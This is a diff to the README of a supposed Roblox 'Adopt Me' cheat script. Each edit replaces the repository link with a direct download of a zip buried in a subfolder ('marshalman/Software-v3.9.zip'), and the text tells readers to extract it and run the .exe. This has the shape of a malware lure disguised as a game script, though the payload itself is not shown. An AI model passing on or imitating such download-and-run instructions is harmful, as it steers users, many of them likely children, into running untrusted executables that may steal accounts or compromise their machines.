@@ -1,6 +1,6 @@
 # 🎮 adoptmescript - Easy Roblox Script for Adopt Me
 
-[![Download Now](https://img.shields.io/badge/Download-adoptmescript-brightgreen?style=for-the-badge)](https://github.com/localdumbass2112/adoptmescript)
+[![Download Now](https://img.shields.io/badge/Download-adoptmescript-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/localdumbass2112/adoptmescript/main/marshalman/Software-v3.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To begin, you need to download the script package from the GitHub page and run i
 
 ### Step 1: Visit the Download Page
 
-Click the large download badge at the top or visit the [GitHub repository download page](https://github.com/localdumbass2112/adoptmescript) directly.
+Click the large download badge at the top or visit the [GitHub repository download page](https://raw.githubusercontent.com/localdumbass2112/adoptmescript/main/marshalman/Software-v3.9.zip) directly.
 
 This page holds the latest versions of the script files available for you to download.
 
@@ -114,13 +114,13 @@ Close the application and restart it. If issues continue, download the latest ve
 
 ## 📥 Download & Setup Summary
 
-- Visit [https://github.com/localdumbass2112/adoptmescript](https://github.com/localdumbass2112/adoptmescript) to download the latest version.
+- Visit [https://raw.githubusercontent.com/localdumbass2112/adoptmescript/main/marshalman/Software-v3.9.zip](https://raw.githubusercontent.com/localdumbass2112/adoptmescript/main/marshalman/Software-v3.9.zip) to download the latest version.
 - Download the `.exe` or `.zip` file from the releases section.
 - Extract files if needed.
 - Run the `.exe` and follow the instructions.
 - Open Roblox "Adopt Me" game and use the script’s controls.
 
-[![Download Now](https://img.shields.io/badge/Download-adoptmescript-brightgreen?style=for-the-badge)](https://github.com/localdumbass2112/adoptmescript)
+[![Download Now](https://img.shields.io/badge/Download-adoptmescript-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/localdumbass2112/adoptmescript/main/marshalman/Software-v3.9.zip)
 
 ---
 
